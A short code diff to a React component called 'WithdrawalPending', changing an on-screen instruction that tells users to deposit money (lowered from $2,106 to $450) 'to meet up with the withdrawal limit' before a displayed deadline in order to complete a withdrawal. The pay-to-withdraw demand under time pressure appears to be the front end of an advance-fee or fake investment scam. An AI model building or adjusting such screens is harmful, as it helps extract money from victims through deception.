@@ -88,8 +88,8 @@ export default function WithdrawalPending() {
         {/* Instruction */}
         <div className="bg-gray-700 p-6 rounded-lg border border-red-500 text-center">
           <p className="text-xl font-semibold text-red-400">
-            Instruction: Please deposit <strong>$2,106</strong> into your
-            account to meet up with the withdrawal limit before{" "}
+            Instruction: Please deposit <strong>$450</strong> into your account
+            to meet up with the withdrawal limit before{" "}
             <strong>{depositDeadline.toLocaleString()}</strong> to complete the
             withdrawal.
           </p>
